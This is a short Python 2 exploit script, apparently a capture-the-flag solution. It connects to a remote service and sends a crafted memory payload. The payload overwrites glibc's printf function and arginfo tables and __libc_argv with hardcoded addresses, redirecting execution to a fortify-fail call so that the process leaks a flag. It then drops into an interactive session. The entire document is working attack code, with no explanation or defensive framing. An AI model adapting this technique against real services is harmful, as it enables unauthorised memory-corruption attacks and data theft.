#!/usr/bin/env python2

import sys, socket, telnetlib
from struct import *

def recvuntil(t):
    data = ''
    while not data.endswith(t):
        tmp = s.recv(1)
        if not tmp: break
        data += tmp

    return data

def interactive():
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

def p32(x): return pack('<I', x)
def u32(x): return unpack('<I', x)[0]
def p64(x): return pack('<Q', x)
def u64(x): return unpack('<Q', x)[0]

def create_garbage(lenght):
    return "\x00"*lenght

offset_function_table = 0x648
offset_arginfo_table = 1736
format_s_offset = ord("s")*8
name_addr = 0x6b73e0
libc_argv = 0x00000000006B7980
call_fortify = 0x000000000043599B
flag_addr = 0x00000000006B4040

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], int(sys.argv[2])))

p = p64(flag_addr)                                  # *_libc_argv
p += create_garbage(format_s_offset - len(p))
p += p64(call_fortify)                              # *__printf_arginfo_table[spec->info.spec]
p += create_garbage(libc_argv-name_addr-len(p))
p+= p64(name_addr)                                  # **_libc_argv
p += create_garbage(offset_function_table-len(p))
p+= p64(0x1)                                        #__printf_function_table
p += create_garbage(offset_arginfo_table-len(p))
p += p64(0x6b73e0)*1                                # __printf_arginfo_table
s.send(p + "\n")
interactive()
s.close()
